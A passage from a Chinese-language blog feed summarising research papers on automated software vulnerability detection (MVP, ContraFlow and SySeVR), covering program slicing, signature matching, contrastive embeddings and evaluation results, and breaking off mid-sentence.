Pv，下面阐述如何生成sig来捕获与漏洞相关的关键语句，而不是将fv和pv中的所有语句都包含在内，以此获得小而准确的sig来进行有效匹配。</p><p>首先识别代码变化，通过解析安全补丁的头文件（diff文件）来识别更改的文件，通过解析diff文件来查找已删除和添加的语句及其行号。同时找到所有函数的起始和结束地址，如果一个语句包括一个或多个已删除（已添加）的代码行，则认为该语句已删除(已添加)，通过比较语句行号和函数行号的关系来确定哪些函数被更改。以此可以获得已添加的语句集合 SaddS_{add}S_{add} ，已删除的语句集合 SdelS_{del}S_{del} ，漏洞函数语句 SvulS_{vul}S_{vul} ，补丁函数语句SpatS_{pat}S_{pat} 。</p><p>利用切片技术可以提取相关的语句并排除无关的语句，本文在PDG上执行前向和后向切片，使用SaddS_{add}S_{add}和 SdelS_{del}S_{del} 作为切片的标准。传统的程序切片方法存在一定的问题，比如下图的例子，如果将第18行的条件语句作为切片标准，那么前向切片包含了太多的语句(19-40)，其中会包含很多与该漏洞无关的噪声语句，而如果将标准严格到与18行直接相关的前向切片，则只有23和24行，真正的漏洞行28行又没有包含在内。也就是说<strong>如果要求直接相关，则切片可能不包含漏洞语句，而如果允许间接相关，切片又存在太多的噪声</strong>。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290958834.jpeg" alt="img"></p><p>再比如说下图的例子，如果以第3行的函数调用作为切片标准，由于其没有返回值，因此只能得到后向切片而无法得到前向切片。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290958824.jpeg" alt="img"></p><p>基于以上的问题，本文提出了一种新的切片方法，将SaddS_{add}S_{add}和 SdelS_{del}S_{del} 中的每个语句作为切片的标准。对于后向切片，正常的基于PDG进行后向切片，获取与标准句相数据依赖和控制依赖的所有语句。对于前向切片，根据不同的语句类型执行不同的切片准则：</p><ul><li>赋值语句：正常按照数据流进行前向切片即可</li><li>条件语句：前向切片过程中只针对条件语句中使用的变量或参数切片（只考虑数据依赖），只有当这样产生的切片为空时，才考虑控制依赖</li><li>返回语句：不需要进行前向切片，因为返回值和返回语句与后面的语句无依赖关系</li><li>其他：包括未使用返回值的函数调用语句，对变量和参数的数据依赖语句切片</li></ul><p>（注：上面条件语句和其他语句指的数据依赖并不是严格意义上的数据依赖，而是先回溯到变量和参数的定义语句再求数据依赖，比如上图正常来说第4行和第3行不存在数据依赖，但在上面的语境下是存在的，第4行在第3行的前向切片中）</p><p>将SdelS_{del}S_{del}以及其对应的前向后向切片放在一起，构成了 SdelsemS_{del}<sup>{sem}S_{del}</sup>{sem} 蕴含着该函数已删除的语句的语义信息， SaddsemS_{add}<sup>{sem}S_{add}</sup>{sem} 同理。</p><p>接下来分别从语法和语义级别上计算漏洞sig和补丁sig，即(Vsyn,Vsem)和(Psyn,Psem)，漏洞sig与漏洞的产生相关，补丁sig与漏洞的修补相关。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290958801.jpeg" alt="img"></p><p>首先是计算Vsyn，SdelsemS_{del}<sup>{sem}S_{del}</sup>{sem}包含了漏洞产生的语义信息，但有漏洞的修改过程不涉及删除语句，只有增加语句，因此还要补上与增加的语句数据或控制依赖的原漏洞函数语句，也就是(1)式，然后根据PDG图由Vsyn得到Vsem，由SdelsemS_{del}<sup>{sem}S_{del}</sup>{sem}得到Tsem。接着将 SaddsemS_{add}<sup>{sem}S_{add}</sup>{sem} 和 SvulS_{vul}S_{vul} 做差集找到只存在于补丁函数中的语句即为Psyn，然后先根据PDG图计算漏洞函数的三元组集F，用T和F做差集就可以得到只存在于补丁函数中的语句（新加的语句）的三元组集Psem。</p><p>然而按照上述方式生成Vsyn还是会发现存在噪声，而且发现Vsyn这与删除(添加)语句远的语句更有可能是噪声。因此本文提出了一种基于信息熵的漏洞语句选择方法。</p><p>设目标系统中语句的总个数为N，Vsyn中某个语句s在目标系统中出现的次数为n，则信息熵为</p><p>Is=−log§=−log(nN)∝1nI_s=-log§=-log(\frac{n}{N}) \propto \frac{1}{n}I_s=-log§=-log(\frac{n}{N}) \propto \frac{1}{n}</p><p>对Vsyn中的所有语句的信息熵求和，得到总信息熵 III ，如果 III 高于某一阈值就不断的删除离删除(添加)语句最远的语句，直到低于该阈值，或者直到剩余的语句均为与改动代码直接数据或控制依赖的语句。</p><p>接着对Sdel，(Vsyn,Vsem)和 (Psyn,Psem)进行如上文所述的规范化处理和计算hash值，得到漏洞sig和补丁sig，对所有的漏洞补丁代码对处理后得到待检测集合。</p><ul><li><strong>将目标系统中的每个函数的signature与漏洞和补丁signature进行匹配</strong></li></ul><p>那么有了目标系统中每个目标函数的sig(fsyn,fsem)，以及删除的语句Sdel，漏洞的sig(Vsyn, Vsem)，补丁的sig(Psyn,Psem)，根据以下原则判断目标函数是否具有漏洞（与漏洞sig匹配但与补丁sig不匹配），规则有以下5条：</p><ul><li>目标函数必须包含所有已删除的语句</li><li>目标函数的签名与漏洞签名在语法层次上匹配（Vsyn和fsyn的交集大于某一阈值）</li><li>目标函数的签名与补丁签名在语法层次上不匹配（Psyn和fsyn的交集小于某一阈值）</li><li>目标函数的签名与漏洞签名在语义层次上匹配（Vsem和fsem的交集大于某一阈值）</li><li>目标函数的签名与补丁签名在语义层次上不匹配（Psem和fsem的交集小于某一阈值）</li></ul><h3 id="evaluation">Evaluation</h3><p>实验回答以下五个问题：</p><ul><li>Q1：与最先进的方法相比，MVP在检测重复漏洞方面的准确性如何？</li><li>Q2：与最先进的方法相比，MVP在检测重复漏洞方面的开销程度如何？</li><li>Q3：在MVP的匹配过程中，如何配置阈值？</li><li>Q4：语句抽象和语句信息的采样对结果的影响有多大？</li><li>Q5：其他漏洞检测方法检测重复漏洞的性能如何？</li></ul><p>本文作者对10个开源的C/C++项目代码进行测试，包含了25377个patch和34,378个有变动的函数，具体数据集如下表所示。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290958794.jpeg" alt="img"></p><p>本文将MVP模型与两类SOTA方法进行对比，一类是基于代码克隆的重复漏洞检测方法，比如Redebug和VUDDY。另一类是基于函数匹配的方法，比如SourcererCC和CCAligner。最后还对比了VulDeepecker和Devign这两种方法，都是目前漏洞检测领域非常优秀的方法。</p><ul><li>Q1：与最先进的方法相比，MVP在检测重复漏洞方面的准确性如何？</li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290958242.jpeg" alt="img"></p><p>由上图可见，在10个开源系统上MVP模型的准确率和召回率都大幅领先。</p><ul><li>Q2：与最先进的方法相比，MVP在检测重复漏洞方面的开销程度如何？</li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290958250.jpeg" alt="img"></p><p>由上图可见，该类方法都可以分为系统分析、补丁分析、匹配三部分，简单来说，时间花销与方法的规模是成比例的，ReDeBug是基于token的，VUDDY是基于语法的，MVP是基于语义的，因此所花费的时间也是以此递增。</p><ul><li>Q3：在MVP的匹配过程中，如何配置阈值？</li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290958358.jpeg" alt="img"></p><p>由上图可见，当匹配的漏洞sig大于0.8且补丁sig小于0.2时，MVP可以达到较高的准确率。当匹配的漏洞sig大于0.8时，召回率会大幅下降，而匹配的补丁sig比例不影响召回率（因为其实相当于不考虑补丁sig的话，主要问题是假阳性率，对召回率影响不大）。</p><ul><li>Q4：语句抽象和语句信息的采样对结果的影响有多大？</li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290958341.jpeg" alt="img"></p><p>如上图所示，其含义是Vsyn采样时信息熵阈值的大小对结果的影响。有图可见，该采样的效果还是非常明显的，阈值在5时，准确率和召回率最高。</p><ul><li>Q5：其他漏洞检测方法检测重复漏洞的性能如何？</li></ul><p>本文还对比了VulDeepecker和Devign这两种方法，发现MVP的结果远远好于这两种方法，VulDeePecker召回率仅为7.2%，Devign召回率为36.0%。</p><h3 id="limitation">Limitation</h3><ul><li>MVP只专注于重复漏洞</li><li>使用joern生成代码属性图，只适用于C/C++</li><li>通过宏来修复的漏洞代码无法进行检测</li><li>对形式参数、局部变量和字符串进行抽象，无法发现有相似函数调用或相似数据类型的漏洞</li></ul><h3 id="conclusion">Conclusion</h3><p>本文提出了一个重复漏洞检测模型MVP，该模型通过同时生成漏洞signature和补丁signature的方式来区分漏洞函数是否打过补丁；同时提出了一种新的函数切片方法，只提取与漏洞和补丁相关的语句，在语法和语义级别生成更加精确的漏洞和补丁的signature。方法过程如下：首先对于待检测的目标系统，为系统中的每个目标函数生成signature；接着生成安全补丁数据集中每一个（漏洞，补丁）对对应的漏洞signature和补丁signature；最后将目标系统中的每个目标函数的signature与漏洞和补丁signature进行匹配，如果在待匹配集合中发现了与目标函数signature相匹配的漏洞signature，但不存在相匹配的补丁signature，则认为目标函数存在重复漏洞。该方法以函数为检测粒度，针对C/C++代码。</p>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Path-Sensitive Code Embedding via Contrastive Learning for Software Vulnerability Detection</title>
      <link href="/2023/12/18/Papers/Vul/Path-Sensitive%20Code%20Embedding%20via%20Contrastive%20Learning%20for%20Software%20Vulnerability%20Detection/"/>
      <url>/2023/12/18/Papers/Vul/Path-Sensitive%20Code%20Embedding%20via%20Contrastive%20Learning%20for%20Software%20Vulnerability%20Detection/</url>
      
        <content type="html"><![CDATA[<h1 id="0-abstract">0 Abstract</h1><p>为了获得代码的结构信息，当前的学习方法通常将程序抽象成图的形式（例如，数据流图，抽象语法树），然后基于安全和易受攻击的代码片段的（子）图来训练底层分类模型以进行漏洞预测。然而，这些模型仍然不足以精确检测缺陷，因为这些模型的目标是产生分类结果，而不是理解漏洞的语义，例如，关键的漏洞触发路径，这对于静态漏洞检测至关重要。本文提出了ContraFlow，这是一种选择性但精确的对比值流嵌入方法，用于静态检测软件漏洞。**ContraFlow的新颖之处在于使用自监督对比学习从预训练的路径嵌入模型中选择和保留可行的值流（也称为程序依赖）路径，从而显著减少了训练昂贵的下游模型进行基于路径的漏洞检测所需的标记数据量。**我们使用288个真实项目评估了ContraFlow，比较了八种最近的基于学习的方法。ContraFlow在信息度、标记度和F1得分方面的表现优于这八个基线方法，最高分别提高了334.1％、317.9％和58.3％，而在定位有缺陷的语句方面，ContraFlow的平均语句召回率、平均语句精度和平均IoU方面的改进分别最高提高了450.0％、192.3％和450.0％。</p><h1 id="1-intro-or-overview">1 Intro or Overview</h1><h2 id="11-problem-and-challenge">1.1 Problem and Challenge</h2><p>Existing Efforts and Limitations. 最近提出了代码嵌入，旨在通过分布式向量表示来表示代码语义，用于源代码分析和错误检测。</p><ul><li>最初，嵌入方法将程序视为文本标记[49-51]，通过应用自然语言处理技术来学习代码语义，而不需要代码结构信息。后来，几种方法[7, 10, 48, 81]通过保留结构信息（例如，通过程序依赖图）改进了嵌入结果，然后使用图神经网络（GNNs）[41, 47]来分类代码片段的（子）图是否易受攻击。</li><li>尽管学习代码的图表示可以用于代码分类或摘要任务，但对于基于路径的漏洞检测仍然不足。 这是因为输入图表示不区分程序路径，而后端GNNs无法识别程序路径。 图特征是从GNNs中所有连接节点对之间的消息传递中学习的，但不幸的是，缺乏任何可行/不可行的值流（程序依赖）路径的知识。but unfortunately, without the knowledge of any feasible/infeasible value-flow (program dependence) paths.</li><li>因此，这些预测模型并不知道潜在的错误路径，这些路径显示了错误的产生和触发方式。这是静态错误检测的主要目标之一：帮助从业者快速定位并修复报告的漏洞。</li></ul><p>Insights and Challenges. 为了解决上述限制，检测方法需要基于精确的学习模型，该模型能够保留价值流路径，而不是整个图，该图无法区分可行/不可行的程序依赖路径。受到词嵌入中令牌袋的概念的启发，一些最近的代码嵌入方法对抽象语法树（ASTs）或值流图（VFGs）上的路径进行了嵌入以进行代码分类和摘要 [62]。这些方法随机抽样一小部分路径以产生它们的嵌入向量，然后聚合它们形成代码片段的最终表示。然而，这些方法不能直接用于诸如基于路径的错误检测等复杂任务，因为可能存在需要嵌入的无界程序路径的数量。</p><p>基于路径的模型的有效性在于路径选择策略。**识别和保留个别可行路径而不是通过随机抽样聚合不可行或与错误无关的路径是具有挑战性但重要的，**以避免在嵌入过程中出现不精确。这需要在模型训练过程中选择性地学习具有判别特征的路径，这些特征在 bug 语义中起作用，以产生用于基于路径的漏洞检测的精确嵌入。</p><h2 id="12-motivation">1.2 Motivation</h2><p>图2通过使用从真实项目POCO（一个用于网络应用程序的库）[31]提取的业务逻辑错误（CWE840）[55]，沿着图1中的三个阶段，阐明了ContraFlow的关键思想。漏洞是由于在rebuild_list(&amp;hd)之后调用set_status(&amp;hd)时API误用引起的，其中hd首先在第2行定义，然后在第6行修改，并在第13行使用。hd的这种错误的值流路径可能导致意外行为并导致服务拒绝。</p><p>注意，从原始代码片段中提取的不同变量的值流路径很大，并且包含许多路径，包括用于可行性检查和嵌入的不可行或与错误无关的路径。我们在阶段（a）中的对比值流嵌入首先对VPE进行预训练，以在潜在空间中保留路径（例如，π1 − π4）的语义，然后使用主动学习在阶段（b）中选择最具代表性的路径，然后进行可行性检查，通过稀疏和受控的值流分析移除不可行的路径π2和π3。阶段（c）进一步微调并解释π1作为训练模型的排名注意分数（π1的90%）中可能存在错误的路径。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404221117563.png" alt="image-20240422104749835"></p><h4 id="a-contrastive-value-flow-embedding">(a) Contrastive Value-Flow Embedding.</h4><p>如图2（a）所示，该阶段的输入是从代码片段中提取的一组值流路径袋，例如，π1（○2 → ○6 → 1○3），π2（○3 → ○9 → 1○3），π3（2○ → ○6 → 1○5）和π4（○3 → ○9 → 1○5）。我们将它们两次馈送到值流路径编码器（VPE）中，使用VPE中的不同dropout掩码[61]，以获得它们的向量表示，例如，vπ1，vπ2，vπ3和vπ4，以及它们的对应对比表示[26]，例如，v+π1，v+π2，v+π3和v+π4。VPE是使用对比学习进行预训练的，以捕获价值流路径的语义，使得预训练的相似嵌入向量（例如，vπ1和v+π1）彼此保持接近，而不相似的对（例如，vπ1和v+π3）则相距较远，如图2(a)所示的二维特征空间。</p><p>VPE的参数在反向传播过程中通过最小化NCE损失[9]来自动更新[33]，该损失编码了价值流嵌入向量之间的相似性。</p><h4 id="b-value-flow-path-selection">(b) Value-Flow Path Selection.</h4><p>对value-flow path抽样，路径可行检查</p><p>该阶段使用从阶段（a）预训练的 VPE 将价值流路径转换为嵌入向量。之后，我们根据从自监督主动学习中学到的排名，对代表性的价值流路径进行抽样，例如，π1 − π4。这些路径进一步被输入到路径可行性检查中，以删除不可行的价值流路径。例如，路径 3○→○9 → 1○3 是不可行的，因为在 3○→ 9○ 和 ○9 → 1○3 处的控制流保护符 !FLG 和 FLG 相互矛盾。同样，○2 →○6 → 1○5 也是不可行的。最后，只有可行的价值流路径 π1 和 π4 被保留用于训练阶段（c）的检测模型。</p><h4 id="detection-model-training">© Detection Model Training.</h4><p>该阶段的输入是由阶段（b）产生的选择的可行且具有代表性的值流路径，这些路径首先使用从阶段（a）转移的VPE模型转换为向量。然后，这些嵌入向量通过一个transformer架构[69]生成每个值流路径的上下文向量。例如，通过与其他向量（例如，π4）进行关注来计算π1的上下文向量，以增加它们对π1的影响。之后，应用软注意力层[1]将这些上下文向量合并为一个向量，用于训练检测模型。</p><p>排名注意力权重指示了不同值流路径对模型输出的贡献。例如，值流路径π1（○2→6○→1○3）的注意力权重最高（90％），而其他路径可以忽略不计，表明该值流路径可能是一个有错误的路径。</p><h2 id="13-contribution">1.3 Contribution</h2><h1 id="2-architecture-method">2 Architecture &amp; Method</h1><h2 id="21-system-overview">2.1 System Overview</h2><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404221053254.png" alt="image-20240422105310211" style="zoom:50%;" /><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404221047923.png" alt="image-20240422104749835"></p><h3 id="a-contrastive-value-flow-embedding-2">(a) Contrastive Value-Flow Embedding.</h3><p>该阶段旨在使用对比学习训练价值流嵌入模型，值流路径编码器（VPE）。</p><ul><li>给定一组从未标记的源代码中使用现有静态分析器SVF提取的值流路径。</li><li>首先执行数据增强以生成对比值流表示[26]，</li><li>然后利用标准的噪声对比估计（NCE）损失函数[9]来最大化语义上相似的值流路径向量之间的一致性。</li></ul><p>这更新了我们的VPE参数，以促使其保留价值流路径的深层语义。<strong>预训练的VPE在接下来的两个阶段中使用。</strong></p><h3 id="b-value-flow-path-selection-2">(b) Value-Flow Path Selection.</h3><p>该阶段旨在精确选择可行且代表性的值流路径，以代表代码片段以支持基于路径的检测模型的快速训练。</p><ul><li>首先使用来自阶段（a）的预训练VPE生成输入路径的特征向量，并使用自监督主动学习[45]对路径进行采样，以捕获最具代表性的路径并使嵌入多样化且信息丰富。</li><li>然后，我们通过对带有注释的值流图（VFG）[12, 64]上的可达性问题进行路径敏感的代码嵌入来执行路径敏感的代码嵌入。</li><li>VFG以稀疏的方式捕获def-use关系，并使用描述控制流传输条件的注释保护边缘。然后，可行性检查被简化为在受保护的VFG上的可达性问题，以仅在低维嵌入空间中嵌入可行路径。</li></ul><h3 id="detection-model-training-2">© Detection Model Training.</h3><p>给定由阶段（b）产生的选定路径和从阶段（a）转移的VPE模型，本阶段将通过仅使用程序的选定路径及其标签（即易受攻击或安全）来训练精确的检测模型。我们首先为每个选定的值流路径获取来自VPE的嵌入向量，然后利用transformer架构[69]为每个路径生成上下文向量以捕获路径之间的交互。然后，这些向量被馈送到软注意力层[1]以对它们进行评分和聚合，形成最终的检测模型训练的一个向量。该模型还可以根据它们对模型输出的贡献来解释重要的值流路径和语句，这些贡献是由学习到的注意力分数排名的。</p><h4 id="contrastive-value-flow-embedding">Contrastive Value-Flow Embedding.</h4><p>对比性值流嵌入旨在通过预训练 VPE 从未标记的代码片段中学习相似/不相似的受保护值流路径 π 的区分性向量表示 vπ。受保护值流路径 π 包括一系列程序语句，表示变量之间的 def-use 链，每个语句之间的边上的guard用于指示控制流转移条件 [12, 64]。这些guard将在阶段 (b) 中的路径可行性求解过程中使用。算法 1 总结了学习算法。对于每个学习时期，我们生成对比向量表示（第 2 行），并计算对比值流路径之间的对比损失（第 3 行）。VPE 的参数将在训练过程中自动更新（第 4 行）。以下段落描述了对比性值流表示和对比损失函数。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404221149879.png" alt="image-20240422114932815"></p><h1 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h1><h2 id="31-dataset-and-process">3.1 DataSet and Process</h2><h2 id="32-evaluation">3.2 <strong>Evaluation</strong></h2><h1 id="4-discusion">4 Discusion</h1><h2 id="conclusion">Conclusion</h2><aside> 💡 Others<hr>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SySeVR</title>
      <link href="/2023/12/18/Papers/Vul/SySeVR/"/>
      <url>/2023/12/18/Papers/Vul/SySeVR/</url>
      
        <content type="html"><![CDATA[<h3 id="摘要">摘要</h3><p>软件漏洞检测目前为止还是一个待被解决的重要问题，因为每天都有很多新的漏洞被发现。使用深度学习方法进行代码漏洞检测是非常有效的，这种方式减轻了对于人为定义特征的要求。尽管深度学习在各个领域取得了巨大的成功，但在漏洞检测领域并没有被研究透彻。为了填补这一空白，本文提出了第一个使用深度学习在C/C++源代码上进行漏洞检测的系统性框架，框架名称叫做SySeVR，全称是“基于语法语义的向量表征”，该框架聚焦于如何获取包含语法和语义信息的代码表征以应用于漏洞检测。该方法检测出了15个没有在NVD中报告过的漏洞，验证了模型的有效性。</p><h3 id="简介">简介</h3><p>假设软件漏洞是不可避免的，那关键的问题是如何更早的发现这些漏洞。基于源代码的静态检测方法包含有基于代码相似性的方法和基于模式的方法，基于代码相似性的方法只能检测与代码克隆相关的漏洞，而基于模式的方法则需要耗费大量的人力去定义模式。因此，最有效的方法是使用深度学习。</p><p>之前的<a href="https://zhuanlan.zhihu.com/p/265616085">VulDeepecker</a>方法是在代码切片层级上进行漏洞检测的，这个方法有4个缺点：1）只能检测与API调用相关的漏洞；2）只包含了语义信息中的数据依赖；3）特征提取模块只用了BLSTM来实现；4）没有解释假阳性和假阴性的原因。本文的SySeVR框架则克服了以上4个缺点。</p><p>本文提出SySeVR框架核心是为了解答这个问题——“如何提取代码的向量化表征，该表征包含着适用于漏洞检测的语法和语义信息？”为了回答该问题，本文引入SyVCs(语法漏洞候选)和SeVCs(语义漏洞候选)两个概念，分别表示漏洞的语法特征和语义特征(数据依赖和控制依赖)。同时，本文设计了自动化提取SyVCs和SeVCs的算法。</p><p>为了评估SySeVR有效性，本文给出了一个从NVD和SARD中提取出来的包含126种漏洞的数据集，数据集的地址为<a href="https://link.zhihu.com/?target=https%3A//github.com/SySeVR/SySeVR">SySeVR</a>。有了新数据集，SySeVR可以实现以下功能：</p><ul><li>SySeVR验证了多种神经网络模型来进行漏洞检测。BRNN，BGRU比RNN，CNN模型更有效，也比DBN和浅层学习模型更有效。</li><li>BGRU的有效性依赖于训练数据，如果某些语法元素经常出现在代码的漏洞(非漏洞)片段中，那这些语法元素就会导致高的假阳(阴)性率，解释了假阳性率和假阴性率的原因。</li><li>考虑更多的语义信息(比如控制依赖和数据依赖)可以减少30.4％的假阴性率。</li><li>在4个软件产品上应用 SySeVR-enabled BGRU模型，检测出了15个没有在NVD中报告过的漏洞。</li></ul><h3 id="模型结构">模型结构</h3><p>在图像处理领域有一个非常经典的概念叫做region proposal（候选区域），研究者可以从图像中提取出很多的proposal然后向量化，使用深度学习训练检测。对于程序代码而言，我们也可以模仿图像中的操作，利用proposal的思想来完成漏洞检测。</p><p>如果使用函数作为proposal，则粒度太高，无法定位具体漏洞位置；如果使用语句作为proposal则会导致正负样本不均衡，且分割了代码语句之间的语义信息。因此，本文采用语句的集合作为proposal，以其为单位进行代码漏洞检测。</p><p>首先，我们定义表示漏洞语法特征的SyVCs。下图展示了由region proposal的灵感产生的SySeVR的框架。简而言之，本文依次生成了SyVCs，SeVCs，对SeVCs向量化后使用深度学习进行训练和检测。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945931.jpeg" alt="img"></p><p>总体而言，SyVCs包含了符合某种漏洞语法特征的代码元素（比如函数调用、指针使用）。SeVCs是由SyVCs生成的，在SyVCs的基础上增加了代码的语义信息，它是一部分相互数据依赖和控制依赖的代码语句的集合。下图是一个直观的示例，SyVCs中的每一个红框代表一个SyVC，不同的SyVC可以相互包含，因为其代表不同的漏洞，比如第18行。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945958.jpeg" alt="img"></p><p>首先说说生成SyVCs。SyVCs包含了符合漏洞语法特征的代码元素，比如上图中18行的data就是一次指针使用，因为第9行出现了’*'号说明了data是指针类型。本文借助抽象语法树来实现SyVCs的生成。对于每一个函数，首先生成函数的抽象语法树，抽象语法树的根节点表示函数，叶子节点表示token，中间节点表示语句或者说连续的token。</p><p>可用于漏洞检测的代码元素可能是AST的叶子节点或中间节点，因此遍历抽象语法树的节点，如果该节点满足某一条漏洞规则，则该节点对应的一个或多个token将作为code element加入到SyVCs中，具体的伪代码如下。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945978.jpeg" alt="img"></p><p>接下来是将SyVCs转化为SeVCs。本文借助代码切片技术去定义与SyVCs语义相关的语句，在介绍该过程前首先要了解几个概念。</p><ul><li>CFG：表示控制流图，它的点是函数语句，边为有向边，表示相邻语句间的运行先后关系。</li><li>数据依赖：如果控制流图中有一条A-&gt;B的路径，且在A语句中计算得到的值会在B语句中使用，则称B数据依赖A。</li><li>控制依赖：如果控制流图中有一条A-&gt;B的路径，且B是否执行需要看A执行的结果(即B不是post-dominate A), 则称B控制依赖A。</li><li>PDG：表示程序依赖图，它的点是函数语句，边为有向边，表示相邻语句间的数据依赖或控制依赖。</li><li>前向切片：一个(SyVC)代码元素的前向切片是由一些语句组成的，这些语句包含了在PDG上从该代码元素出发所有可达的点。</li><li>过程间前向切片：过程间前向切片比前向切片多了一些语句，多的语句是在PDG中代码元素可以通过函数调用到达的点。</li><li>后向切片：一个(SyVC)代码元素的后向切片是由一些语句组成的，这些语句包含了在PDG上所有与该代码元素可达的、且以该代码元素为终点的点。</li><li>过程间后向切片：过程间后向切片比后向切片多了一些语句，多的语句是在PDG中可以通过函数调用到达代码元素的点。</li><li>程序切片：由过程间前向切片和过程间后向切片的语句融合构成，删掉了其中重复的部分。</li></ul><p>有了这些概念后，就可以开始生成SeVCs了，SeVCs其实就是与SyVCs中的代码元素相控制依赖和数据依赖的语句的集合，其具体生成的伪代码如下。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945940.jpeg" alt="img"></p><p>首先生成源代码的PDG图，对于PDG中一个的代码元素，生成前向切片和后向切片。然后，融合前向切片和被该函数调用的函数的前向切片，得到过程间前向切片。融合后向切片、被该函数调用的函数的后向切片、以及调用该函数的函数的后向切片，得到过程间后向切片。融合过程间前向切片和过程间后向切片得到程序切片，至此，对于PDG中的该代码元素，生成了其对应的程序切片。</p><p>程序切片中的所有函数语句构成一个集合。对于不同的函数的语句而言，调用者的语句在被调用者的语句之前。调整好顺序后，该集合就是该代码元素(SyVC)对应的SeVC了，对SyVCs中的每一个SyVC这样处理，就可以生成SeVCs。下图是一个以25行的data为SyVC的一个转换示例，体现了从PDG到切片到SeVC的完整过程。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945964.jpeg" alt="img"></p><p>有了SeVCs，之后就是对SeVCs的向量化编码操作了。下图为该过程的详细伪代码，在此不一一赘述。简单来说，对于每个SeVC，首先删除不合法字符，对函数和变量名进行映射标准化(V1,V2,F1,F2之类的)。之后，将每个SeVC的每个单词embedding成固定长度的向量，将单词concate到一起。</p><p>此时要求concate后的SeVC的向量长度为固定值theta，如果不够就补全；如果超过theta就看SeVC向量两端到SyVC元素有没有小于 1/21/21/2 theta的，有则删去另一端至总长度为theta。如果都没有小于 1/21/21/2 theta的，则两端一起删到两端到SyVC元素都为1/21/21/2 theta。这样就将SeVCs编码为了长度为theta的向量的集合，此时给该集合加上标记，有漏洞的SeVC标签为1，没有漏洞则为0，之后使用双向GRU网络训练检测即可。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945970.jpeg" alt="img"></p><h3 id="实验部分">实验部分</h3><p>本文在NVD和SARD两个数据集上进行实验。对于NVD，本文收集了1591个开源C/C<ins>程序，其中874个是有漏洞的。对于SARD，本文收集了14000个C/C</ins>程序，其中13906个是有漏洞的，这里的有漏洞包含bad和mix，bad指的是有漏洞，mix指的是漏洞版本和修复好的版本都有。合计，本文收集了15591个程序，其中14780个是有漏洞的，对应126种CWE漏洞类型。</p><p>实验过程大体上和前文模型结构讲的类似，其中值得注意的是提取SyVCs的时候如何获取漏洞的语法特征并进行匹配。本文通过checkmarx工具提取出了4中类型的漏洞语法规则。</p><ul><li>API/库函数调用(FC)：包含了811个函数调用，对应于106种CWE漏洞。</li><li>数组使用(AU)：包含87种CWE漏洞，比如数组元素访问，地址计算等等。</li><li>指针使用(PU)：包含103种CWE漏洞，比如不合法的指针计算、引用、传参。</li><li>算术表达式(AE)：包含45种CWE漏洞，不合法的算术表达式，比如整数溢出等。</li></ul><p>下图为这4类漏洞覆盖的CWE漏洞类型。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945424.jpeg" alt="img"></p><p>有了漏洞特征后重点是如何讲代码元素与漏洞特征进行匹配，下图是一个匹配SyVC的示例。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945457.jpeg" alt="img"></p><ul><li>FC判定需要满足该代码元素是一个函数调用，且属于811种函数调用之中。</li><li>AU判定需要满足这是一个标识符声明语句且包含’[‘和’]’。</li><li>PU判定需要满足这是一个标识符声明语句且包含’*’。</li><li>AE判定需要满足这是一个表达式语句且包含’=’，并且等号右端有两个以上的元素。</li></ul><p>从SyVCs转化为SeVCs按算法做就好，本文最终生成SeVCs的结果如下表所示：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945468.jpeg" alt="img"></p><p>在编码阶段使用word2vec进行编码(gensim)，每个单词向量长度为30，一个SeVC最多500个单词，theta为15000。</p><p>最后说说生成标签，该过程分为两步。第一步是生成初始的标签，针对NVD数据集，如果一个SeVC包含的删除或修改的语句前面有’-’，则被标记为1(有漏洞)；而如果一个SeVC包含的移动的语句前面有’-’，且这个文件包含一个已知的漏洞，则被标记为1；其他情况都标记为0。针对SARD数据集，如果一个SeVC提取自一个good程序，则被标记为0；如果提取自bad或mix程序，则分情况，若该SeVC包含至少一个漏洞语句则标记为1，否则标记为0。</p><p>接下来第二步，使用交叉验证的方式来修正标签。比如将数据集分为5份，4份训练，1份测试。在测试过程中发现的假阴性样本（有漏洞的样本检测为无漏洞）将会被考虑是否标错了，对于这类样本手动检查修正标签。</p><p>接下来就是最后的模型结果。本文的实验结果旨在说明四个问题：</p><ul><li>1：SySeVR搭配BLSTM可以检测多种类型的漏洞吗？</li><li>2：SySeVR可以搭配各种各样的神经网络来进行漏洞检测吗，检测效果如何？</li><li>3：考虑控制依赖是否使得SySeVR更加有效，结果好了多少？</li><li>4：SySeVR相比现有的SOTA方法如何？</li></ul><p>对于第一个问题，作者将SySeVR-BLSTM模型分别检测4种类型的漏洞，于VulDeepecker模型的结果进行比较，结果如下图所示，可见SySeVR-BLSTM模型的结果明显优于VulDeepecker模型，证明了该模型可以有效的检测多